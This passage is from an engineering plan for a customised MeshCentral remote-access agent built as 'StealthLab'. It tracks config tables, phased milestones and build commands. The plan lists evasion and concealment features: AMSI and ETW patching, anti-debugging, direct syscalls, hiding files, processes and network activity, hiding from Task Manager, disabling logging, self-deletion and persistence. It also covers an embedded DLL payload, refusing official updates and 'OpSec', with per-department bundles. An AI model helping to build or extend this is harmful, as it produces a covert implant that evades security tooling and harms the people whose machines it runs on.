- [ ] **Test:** `msbuild MeshAgent-2022.sln /p:Configuration=StealthLab /p:DeviceGroup=default` succeeds using native headers only.
- **Exit criteria:** removing `branding_config.json` does not break the build; tests prove parity for the default group.

#### Native Config Coverage Snapshot (2025-10-24)

**Branding** (`meshcore/config/branding_core.h`)

| JSON Field | Native Symbol / Location | Status | Notes |
| --- | --- | --- | --- |
| `branding.serviceName` | `MESH_AGENT_SERVICE_NAME` ? `mesh_branding_definition_t::serviceName` | ? Wired (via generated header) | Still sourced from `meshcore/generated/meshagent_branding.h`; will become constexpr once JSON is deprecated. |
| `branding.displayName` | _Not represented_ | ?? Gap | Add `displayName` to `mesh_branding_definition_t` and enforce length constraints via `static_assert`. |
| `branding.binaryName` | `MESH_AGENT_SERVICE_FILE` ? `mesh_branding_definition_t::serviceFile` | ? Present | Rename field to `binaryName` when header stops mirroring legacy macros. |
| `branding.companyName` / `productName` | `MESH_AGENT_COMPANY_NAME`, `MESH_AGENT_PRODUCT_NAME` | ? Wired | Converts to `const char*` at compile time. |
| `branding.description` | _Not represented_ | ?? Gap | Currently unused; decide whether to alias to `fileDescription` or keep as separate telemetry string. |
| `branding.logPath` | `MESH_AGENT_LOG_DIRECTORY` ? `mesh_branding_definition_t::logDirectory` | ? Wired | Still injected via generated header. |
| `branding.installRoot` | _Not represented_ | ?? Gap | Needs new constant for filesystem layout + runtime validation. |
| `branding.versionInfo.*` | `MESH_AGENT_FILE_VERSION_*`, `MESH_AGENT_PRODUCT_VERSION_*`, `MESH_AGENT_FILE_DESCRIPTION`, `MESH_AGENT_INTERNAL_NAME`, `MESH_AGENT_ORIGINAL_FILENAME`, `MESH_AGENT_COPYRIGHT` | ? Wired | Arrays already validated for length; keep JSON bridge until constexpr definitions exist. |

**Network** (`meshcore/config/network_profiles.h`)

| JSON Field | Native Symbol / Location | Status | Notes |
| --- | --- | --- | --- |
| `network.primaryEndpoint` | `MESH_AGENT_NETWORK_ENDPOINT` ? `mesh_network_profile_t::primaryEndpoint` | ? Wired | Powered by generated header; needs constexpr replacement. |
| `network.userAgent` | `MESH_AGENT_NETWORK_USER_AGENT` | ? Wired | |
| `network.sni` | `MESH_AGENT_NETWORK_SNI` (optional macro) | ? Optional | Falls back to `NULL` when macro absent. |
| `network.alpn` | `MESH_ALPN_PROTOCOLS` | ? Optional | Currently free-form string; should become array for multi-protocol support. |
| `network.hostHeader` | _Not represented_ | ?? Gap | Required for front-door/CDN spoofing scenarios. |
| `network.connectionTimeout` / `retryAttempts` / `retryDelay` / `keepAlive` / `compression` | _Not represented_ | ? Missing | Need additional fields + validation helpers (Phase 1 follow-up). |
| TLS min/max overrides | `MESH_TLS_MIN_VERSION` / `MESH_TLS_MAX_VERSION` | ? Defaulted | Defaults to TLS1.2?1.3 when macros absent; JSON currently lacks knobs. |

**Stealth** (`meshcore/config/stealth_config.h`)

| JSON Field | Native Symbol / Location | Status | Notes |
| --- | --- | --- | --- |
| `stealth.enabled` | `MESH_AGENT_STEALTH_ENABLED` | ? Wired | |
| `stealth.svchostMode` | `MESH_AGENT_SVCHOST_MODE` | ? Wired | Toggle still tied to PS provisioning. |
| `stealth.bundleExtract` | `MESH_AGENT_BUNDLE_EXTRACT_DEFAULT` | ? Wired | Rename constant when Phase 2 embedding lands. |
| `stealth.hideFiles` / `hideRegistry` | `MESH_AGENT_HIDE_FILES`, `MESH_AGENT_HIDE_REGISTRY` | ? Wired | |
| `stealth.amsiPatch` / `ettwPatch` | `MESH_AGENT_AMSI_PATCH`, `MESH_AGENT_ETW_PATCH` | ? Wired | |
| `stealth.antiDebug` | `MESH_AGENT_ANTI_DEBUG` | ? Wired | |
| `stealth.syscallsDirectMode` | `MESH_AGENT_SYSCALLS_DIRECT` | ? Wired | |
| `stealth.hideProcess` / `hideNetwork` / `hideFromTaskManager` / `reflectiveLoading` / `encryptMemory` / `disableLogging` / `selfDelete` | _Not represented_ | ? Missing | Requires expanded struct + compile-time guards; some values migrate to new persistence module. |

**Outstanding Sections**

- `artifacts.*`, `persistence.*`, `evasion.*`, `security.*`, `provisioning.*`, and `advanced.*` remain JSON-only?no native scaffolding exists yet.
- `meshcore/config/build_config.h` stub still needs to select group headers and expose `constexpr` handles so other modules can consume them without touching generated headers.
- `config_common.h` currently includes the generated headers directly; Phase 1 must replace those `#include`s with the new native definitions.


### Phase 2 (Week 2-3): Resource Embedding
- [x] Author `tools/bin2h` (or similar) to emit deterministic payload headers + manifest.
- [x] Convert svchost DLL to header/PE section + implement native extraction helper inside ServiceMain/installer (RC payload removed).
- [ ] Add SHA256 integrity verification + signer thumbprint assertion before loading payload (runtime self-check).
- [ ] Flow payload metadata into MeshCentral packaging so only the EXE + JSON manifest ship (no staged DLL artifacts).
- [ ] Extend `test.ps1` with privileged runtime validation (`-RuntimeValidation`) to exercise `-install/-uninstall` and svchost `-register/-status/-unregister` flows.
- [ ] **Test:** Integration test exercises DLL extraction + load validation on x64.
- **Exit criteria:** Build tree has zero `.rc` payload references; payload integrity failure blocks startup.

> Detailed work breakdown, TODO board, and validation plan live in `docs/CORE_MIGRATION_PHASE2_PLAN.md`. Treat that document as the source of truth for task status during this phase.

### Phase 3 (Week 3-4): Deployment Automation (Native)
- [ ] Implement C++ service registration + recovery policy configuration.
- [ ] Embed svchost integration, watchdog, and persistence logic directly in `MeshService`.
- [ ] Remove PowerShell install/update scripts from the critical path (keep for ops only).
- [ ] **Test:** Clean VM install succeeds using native binary alone (no scripts).
- **Exit criteria:** `MeshService-2022.exe --register --start` performs full deployment unattended.

### Phase 4 (Week 4-5): Multi-Group + Packaging
- [ ] Create group build orchestrator (MSBuild or CMake presets) that emits per-group artefacts.
- [ ] Package each group (bin + manifests + verification) under `dist/groups/<group>/`.
- [ ] Add self-extracting installer wrapper (SFX or MSIX) per group.
- [ ] **Test:** CI matrix builds Finance + Engineering variants in parallel and archives outputs.
- **Exit criteria:** Running `build_all_groups.ps1` (or equivalent) produces versioned bundles for every supported group with signed digests.

### Phase 5 (Week 5-6): MeshCentral Integration & Safeguards
- [ ] Mirror stock MeshCentral version metadata + add runtime compatibility validation.
- [ ] Implement update rejection to stop MeshCentral from downgrading custom agents.
- [ ] Add runtime self-verification (e.g., hash check of embedded config/payload).
- [ ] Configure MeshCentral server + pipeline docs for custom agent safelisting.
- [ ] **Test:** MeshCentral update workflow leaves custom agents untouched; self-tests log success.
- **Exit criteria:** Update cycles + rollback tests pass, MeshCentral recognizes custom version strings, and runtime validation alarms on tamper.

### Phase 6: Final Verification & Migration Guide
- [ ] Full end-to-end regression (unit, svchost, update, multi-group packaging).
- [ ] Performance + footprint comparison vs baseline (Phase 0).
- [ ] Documentation sweep (operator guides, migration playbook, CI README).
- [ ] Executive-ready migration guide (scope, residual risks, rollback steps).
- **Exit criteria:** Sign-off bundle includes regression evidence, documentation, and approval to sunset legacy tooling.

## ­ o. Success Criteria (Target vs Current)

### Build System
- **Target:** Zero Python / PowerShell in critical path, single MSBuild command per group, compile-time validation everywhere, automated multi-group builds.
- **Current:** PowerShell orchestrates every build, Python generates network profiles, configs live in JSON, and only StealthLab x64 is routinely built.

### Customization Preservation
- **Target:** Branding + payload data compiled into immutable sections, runtime validation enforces integrity, MeshCentral cannot overwrite without alerting.
- **Current:** Branding header regenerated from JSON/PS, payload staged via RC resources, no runtime tamper checks, MeshCentral can still push stock agents.

### Deployment
- **Target:** Native binary performs registration, svchost wiring, persistence, and cleanup with a single command; ops scripts are optional wrappers.
- **Current:** PowerShell deploy scripts own service creation + cleanup, svchost payload staged post-build, persistence toggles exist only in JSON.

### MeshCentral Integration
- **Target:** Custom agents negotiate version compatibility, reject unauthorized updates, and surface verification logs in MeshCentral.
- **Current:** Version metadata diverges from stock values, MeshCentral still eligible to replace agents, and no runtime reporting exists.


### Build System
- ✅ Zero Python dependencies
- ✅ Zero PowerShell dependencies
- ✅ Single MSBuild command builds everything
- ✅ Compile-time validation of all configs
- ✅ Multi-group builds automated

### Customization Preservation
- ✅ Branding compiled into binary
- ✅ DLL embedded in .text section
- ✅ MeshCentral cannot strip customizations
- ✅ Runtime verification confirms configs

### Deployment
- ✅ Single EXE deploys entire system
- ✅ No external scripts needed
- ✅ Self-extracting installers per group
- ✅ Native service registration

### MeshCentral Integration
- ✅ Custom agents recognized by server
- ✅ Auto-update doesn't overwrite
- ✅ Version strings compatible
- ✅ Signing preserves customizations

---

## 🔒 Security Considerations

### Benefits of Core-File Architecture

1. **Immutability**
   - Customizations cannot be stripped
   - MeshCentral cannot modify
   - Tamper-evident

2. **Verification**
   - Runtime checks confirm configuration
   - Detect if MeshCentral modified anything
   - Self-healing possible

3. **OpSec**
   - No external config files
   - No build-time artifacts
   - Everything self-contained

4. **Reliability**
   - No missing dependencies
   - No version conflicts
   - Deterministic builds

---

## 🚧 Known Challenges

### Challenge 1: Large Embedded Binaries

**Problem:** 2.4 MB DLL embedded as C array

**Impact:**
- Longer compile times
- Large source files
- Git repository size

**Solutions:**
1. Use binary resources (PE sections) instead of C arrays
2. Compress embedded data, decompress at runtime
3. Store compressed in separate .bin file, link at compile time

**Recommendation:** Use PE section embedding:
```cpp
#pragma section(".payload", read)
__declspec(allocate(".payload"))
const unsigned char EMBEDDED_DLL[] = {
    #include "payload_data.h"
};
```

### Challenge 2: Multi-Group Build Time

**Problem:** Building 3 groups × 2 architectures = 6 builds

**Impact:** ~30 minutes total build time

**Solutions:**
1. Parallel builds (MSBuild /m)
2. Incremental builds (only rebuild changed groups)
3. CI/CD caching

**Recommendation:** Build only changed groups during development

### Challenge 3: MeshCentral Compatibility

**Problem:** MeshCentral may still detect version mismatch

**Impact:** Server marks agent as "outdated"

**Solutions:**
1. Match stock agent version strings exactly
2. Patch MeshCentral server to recognize custom agents
3. Fork MeshCentral for full control

**Recommendation:** Implement version string matching (Phase 5)

---

## 📚 Next Steps

### Immediate Actions

1. **Review This Plan**
   - Validate architecture
   - Identify missing requirements
   - Prioritize phases

2. **Proof of Concept**
   - Implement Phase 1 (config headers) only
   - Test with single group
   - Validate compile-time checks work

3. **Decision Points**
   - Commit to full migration?
   - Which groups to support?
   - Timeline constraints?

### Questions to Answer

1. **How many device groups do you need?**
   - Default, Finance, Engineering mentioned
   - Any others?

2. **MeshCentral version?**
   - What version are you running?
   - Can you update server config?
   - Can you patch/fork server?

3. **Build environment?**
   - Windows only? Linux cross-compile?
   - Visual Studio version?
   - CI/CD pipeline?

4. **Signing strategy?**
   - Do you have code signing cert?
   - Where does signing happen?
   - Before or after MeshCentral upload?

---

## 📞 Support

### Getting Started

1. Read this document thoroughly
2. Review current codebase
3. Test proof-of-concept (Phase 1)
4. Provide feedback on architecture

### Concerns & Feedback

Create GitHub issue or discussion for:
- Architecture questions
- Implementation challenges
- Timeline adjustments
- Feature requests

---

**Document Version:** 1.0
**Created:** 2025-10-24
**Status:** Draft - Pending Review
**Estimated Effort:** 4-6 weeks full-time

---

## Appendix A: File Structure Reference

**Before Migration:**
```
MeshAgent/
├── branding_config.json          (External config)
├── tools/
│   ├── generate_branding.py      (Python script)
│   ├── prepare_meshcentral_agent.ps1  (PowerShell)
│   └── deploy_stealth_agent.ps1  (PowerShell)
├── meshservice/
│   ├── bundle_resources.rc       (legacy resource file – removed in Phase 2)
│   ├── embedded/
│   │   └── svchost_payload.dll   (Runtime staging)
│   └── MeshService-2022.vcxproj
└── meshcore/
    └── generated/
        └── meshagent_branding.h  (Generated)
```

**After Migration:**
```
MeshAgent/
├── meshcore/
│   ├── config/
│   │   ├── branding_core.h       (Native config)
│   │   ├── network_profiles.h    (Native config)
│   │   ├── stealth_config.h      (Native config)
│   │   ├── build_config.h        (Preprocessor)
│   │   └── group_configs/
│   │       ├── group_default.h
│   │       ├── group_finance.h
│   │       └── group_engineering.h
│   ├── embedded/
│   │   ├── payload_data.h        (Generated C array)
│   │   ├── payload_extract.cpp   (Native code)
│   │   └── payload_verify.cpp    (Native code)
│   ├── deployment/
│   │   ├── service_registration.cpp
│   │   ├── svchost_integration.cpp
│   │   └── persistence.cpp
│   └── validation/
│       ├── runtime_validator.cpp
│       └── meshcentral_compat.cpp
├── tools/
│   └── bin2h/                    (C++ tool)
│       └── bin2h.cpp             (Binary-to-header)
├── meshservice/
│   └── MeshService-2022.vcxproj  (Updated)
└── dist/
    └── groups/                   (Output)
        ├── default/
        ├── finance/
        └── engineering/
```

---

## Appendix B: Build Command Reference

**Current Build:**
```powershell
# Generate headers
python tools/generate_branding.py

# Build DLL
msbuild meshservice/MeshService-2022.vcxproj /p:Configuration=StealthLab_DLL /p:Platform=x64

# Stage DLL
Copy-Item meshservice/x64/StealthLab_DLL/MeshService-2022.dll meshservice/embedded/svchost_payload.dll

# Build EXE
msbuild meshservice/MeshService-2022.vcxproj /p:Configuration=StealthLab /p:Platform=x64

# Prepare for MeshCentral
powershell tools/prepare_meshcentral_agent.ps1
```

**Future Build (Native):**
```batch
REM Build all groups
tools\bin\build_all_groups.exe

REM Or build single group
msbuild MeshAgent-2022.sln /p:Configuration=StealthLab /p:DeviceGroup=FINANCE /p:Platform=x64
```

---

**End of Master Plan**

